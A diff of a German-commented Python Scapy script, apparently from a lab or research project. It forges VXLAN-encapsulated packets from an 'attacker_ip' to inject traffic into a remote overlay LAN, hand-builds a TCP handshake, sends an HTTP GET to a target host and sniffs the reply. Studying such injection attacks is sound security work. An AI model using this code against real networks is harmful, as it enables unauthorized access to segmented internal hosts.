@@ -48,12 +48,6 @@ else:
 ### VXLAN Paket: Hierueber werden Ethernet Frames ins LAN eingefuert
 VXLAN = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vx_vnid,flags="Instance")/Ether(dst=mac_dst,src=mac_src)
 
-### HTTP GET Paket 
-# Hier wurd durch ein Argument des Skripts die Destination Address mitgtgeben. Accept-Encoding ist 8bit, damit nicht codiert wird.
-dest = sys.argv[1]
-getStr = 'GET / HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: 8bit\r\n\r\n'
-
-
 ### syn_ack_do ist die Funktion, die beim sniffen des SYN/ACK Pakets ausgefuehrt wird
 # Fuer das folgenden ACK Paket sind folende Parameter wichtig: Dst_Port, ACK#, SEQ#
 def syn_ack_do(packet):
@@ -73,7 +67,7 @@ def syn_ack_do(packet):
         print("")
     return
 
-#SEND SYN
+#$$$$$ SEND SYN
 syn = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(sport=s_port, dport=http_port, flags='S')
 send(syn, verbose=0)
 if debug:
@@ -83,10 +77,10 @@ if debug:
         print("Destination IP Address = " + str(dest))
         print("")
 
-#GET SYNACK : TCP flags SYN and ACK are set
+#$$$$$ GET SYNACK : TCP flags SYN and ACK are set
 sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & ACK and x[TCP].flags & SYN, prn=syn_ack_do, count = 1)
 
-#Send ACK
+#$$$$$ SEND ACK
 ack = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='A')
 out_ack = send(ack, verbose=0)
 if debug:
@@ -97,26 +91,8 @@ if debug:
         print("")
 
 
-### Print the layers of the packet
-def get_packet_layers(packet):
-     counter = 0
-     while True:
-         layer = packet.getlayer(counter)
-         if layer is None:
-             break
-
-         yield layer
-         counter += 1
-
-# for layer in get_packet_layers(http_answer):
-#     print (layer.name)
-
-#ls(http_answer)
-#print(http_answer.getlayer(IP).src)
-#print(http_answer.getlayer(HTTP).Transfer-Encoding)
-
-
-
+### Thread Klasse initiieren fuer den Sniffer von HTTPResponse
+# bei run() wird  sniff_http_response_thread() ausgefuehrt
 class myThread (threading.Thread):
    def __init__(self):
       threading.Thread.__init__(self)
@@ -125,54 +101,46 @@ class myThread (threading.Thread):
 
 
 ### Sniff Funktion fuer sniff_http_response_thread
-full_http_response = ""
 def get_http_packet(packet):
-        global http_answer 
-        http_answer = packet
-        global full_http_response
-        #full_http_response += packet.getlayer(Raw).load
-        #for layer in get_packet_layers(http_answer):
-        #    print (layer.name)
-        print("TCP ACK =  " + str(packet.getlayer(TCP).ack))
-        print("TCP SEQ =  " + str(packet.getlayer(TCP).seq))
-        print("HTTP Layer vorhanden? : " + str(packet.haslayer(HTTPResponse)))
-        print("Source IP =  " + str(packet.getlayer(IP).src))
+        if debug:
+            print("TCP ACK =  " + str(packet.getlayer(TCP).ack))
+            print("TCP SEQ =  " + str(packet.getlayer(TCP).seq))
+            print("HTTP Layer vorhanden? : " + str(packet.haslayer(HTTPResponse)))
+            print("Source IP =  " + str(packet.getlayer(IP).src))
         if packet.haslayer(HTTPResponse) is True:
-            string_raw = str(packet.getlayer(Raw).load)
-            print("HTTP Body faengt an mit:  " + string_raw) ### [0:10]
-            print("Der Body hat eine Laenge von:  " + str(len(string_raw)))
+            http_response_body = str(packet.getlayer(Raw).load)
+            print http_response_body
+        else:
+            print("Keine HTTP Layer vorhanden")
         print("")
         return
 
-### Sniff HTTP Response Function
-# 
-# Sie filtert auf TCP Pakete mit der ACK Nummer 58. Der Request hast eine Laenge von 57. Die Ack Nummer ist L
-#
+### Sniff Funktion um HTTPResponse zu finden
+# Sie filtert auf TCP Pakete mit der ACK Nummer 58. Der Request hast eine Laenge von 57. Die Ack Nummer ist Length + 1
 def sniff_http_response_thread():
     sniff(filter = "tcp port " + str(http_port) + " and tcp[11] == 58 and tcp[13] == 24 and greater 100", prn=get_http_packet, count = 1)  # + " and tcp[tcpflags] & tcp-ack == 58"
     return
 
-#create sniff thread
+# Sniffer als Thread initiieren und starten, damit waehrend der Request losgeschickt wird
+# auch sehr schnelle Responses eingefangen werden koennen
 sniffer = myThread()
-#sniffer1 = myThread()
-
-# Start sniff thread
 sniffer.start()
-#sniffer1.start()
+time.sleep(1) #Sniffer braucht ein wenig Zeit zum wach werden
 
-#let the sniffer some time to activate
-time.sleep(1)
+### HTTP GET Paket 
+# Hier wurd durch ein Argument des Skripts die Destination Address mitgtgeben. Accept-Encoding ist 8bit, damit nicht codiert wird.
+dest = sys.argv[1]
+getStr = 'GET / HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: 8bit\r\n\r\n'
 
-# send HTTP Request
-send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='P''A') / getStr)
-
-time.sleep(1)
-
-#http_layer = http_answer.getlayer(http.HTTPResponse)
-#ip_layer = http_answer.getlayer(IP)
-#raw = http_answer.getlayer(Raw)
-#print '\n{0[src]} Sends a response on {1[Date]} and Server {1[Server]} and Content is \r\n\r\n'.format(ip_layer.fields, http_layer.fields)
-#print(full_http_response)
+#$$$$$ SEND HTTP Request
+http_request = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='P''A') / getStr
+send(http_request, verbose=0)
+if debug:
+        print("############## HTTP Request sent #####################")
+        print("srcport = " + str(syn_ack_dport)) 
+        print("ACK# = " + str(syn_ack_seq + 1))
+        print("SEQ# = " + str(syn_ack_ack))
+        print("")
 
 
 
